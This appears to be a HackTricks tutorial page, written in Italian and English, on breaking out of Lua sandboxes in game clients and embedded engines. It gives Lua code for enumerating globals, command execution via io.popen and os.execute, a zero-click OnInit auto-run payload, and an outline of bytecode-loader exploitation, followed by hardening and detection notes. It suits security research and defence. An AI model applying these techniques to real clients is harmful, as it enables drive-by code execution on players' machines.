# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Questa pagina raccoglie tecniche pratiche per enumerare e uscire da Lua "sandboxes" integrate nelle applicazioni (in particolare game clients, plugins o in-app scripting engines). Molti engine espongono un ambiente Lua ristretto, ma lasciano globals potenti raggiungibili che permettono l'esecuzione arbitraria di comandi o persino la corruzione della memoria nativa quando sono esposti bytecode loaders.

Concetti chiave:
- Treat the VM as an unknown environment: enumerate _G and discover what dangerous primitives are reachable.
- When stdout/print is blocked, abuse any in-VM UI/IPC channel as an output sink to observe results.
- If io/os is exposed, you often have direct command execution (io.popen, os.execute).
- If load/loadstring/loadfile are exposed, executing crafted Lua bytecode can subvert memory safety in some versions (≤5.1 verifiers are bypassable; 5.2 removed verifier), enabling advanced exploitation.

## Enumerare l'ambiente sandbox

- Dump the global environment to inventory reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se print() non è disponibile, riutilizza i canali in-VM. Esempio tratto da una VM di script per housing di un MMO in cui l'output della chat funziona solo dopo la riproduzione di un suono; il seguente costruisce una funzione di output affidabile:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizza questo pattern per il tuo target: qualsiasi textbox, toast, logger o UI callback che accetta stringhe può fungere da stdout per reconnaissance.

## Esecuzione diretta di comandi se io/os è esposto

Se la sandbox espone ancora le librerie standard io o os, è probabile che tu possa eseguire comandi immediatamente:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Note:
- L'esecuzione avviene all'interno del processo client; molti layer anti-cheat/antidebug che bloccano debugger esterni non impediranno la creazione di processi dentro la VM.
- Controllare anche: package.loadlib (caricamento arbitrario di DLL/.so), require con moduli nativi, LuaJIT's ffi (se presente), and the debug library (can raise privileges inside the VM).

## Trigger Zero-click tramite auto-run callbacks

Se l'applicazione host invia script ai client e la VM espone auto-run hooks (es. OnInit/OnLoad/OnEnter), piazza il tuo payload lì per una compromissione drive-by non appena lo script viene caricato:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualsiasi callback equivalente (OnLoad, OnEnter, etc.) generalizza questa tecnica quando gli script vengono trasmessi ed eseguiti automaticamente sul client.

## Dangerous primitives to hunt during recon

Durante l'enumerazione di _G, cerca specificamente:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: eseguire sorgente o bytecode; supporta il caricamento di bytecode non attendibile.
- package, package.loadlib, require: caricamento dinamico di librerie e interfaccia dei moduli.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, e hooks.
- LuaJIT-only: ffi.cdef, ffi.load per chiamare codice nativo direttamente.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation opzionale: abuso dei loader di bytecode di Lua

Quando `load`/`loadstring`/`loadfile` sono raggiungibili ma `io`/`os` sono limitati, l'esecuzione di bytecode Lua creato ad hoc può portare a primitive di divulgazione della memoria e corruzione. Punti chiave:
- Lua ≤ 5.1 includeva un verificatore di bytecode che ha bypass noti.
- Lua 5.2 ha rimosso il verificatore completamente (posizione ufficiale: le applicazioni dovrebbero semplicemente rifiutare i precompiled chunks), ampliando la superficie di attacco se il caricamento di bytecode non è proibito.
- Tipici workflow: leak pointers via in-VM output, craft bytecode per creare type confusions (es., attorno a FORLOOP o altri opcodes), quindi pivotare verso arbitrary read/write o native code execution.

Questo percorso è specifico per engine/version e richiede RE. Vedi i riferimenti per approfondimenti, exploitation primitives e esempi di gadgetry nei giochi.

## Note di rilevamento e hardening (per i difensori)

- Lato server: rifiutare o riscrivere gli user script; usare allowlist per le API sicure; rimuovere o bindare a vuoto `io`, `os`, `load`/`loadstring`/`loadfile`/`dofile`, `package.loadlib`, `debug`, `ffi`.
- Lato client: eseguire Lua con un `_ENV` minimale, vietare il caricamento di bytecode, reintrodurre un strict bytecode verifier o controlli di firma, e bloccare la creazione di processi dal processo client.
- Telemetria: generare allarmi su gameclient → child process creation poco dopo lo script load; correlare con eventi UI/chat/script.

## Riferimenti

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
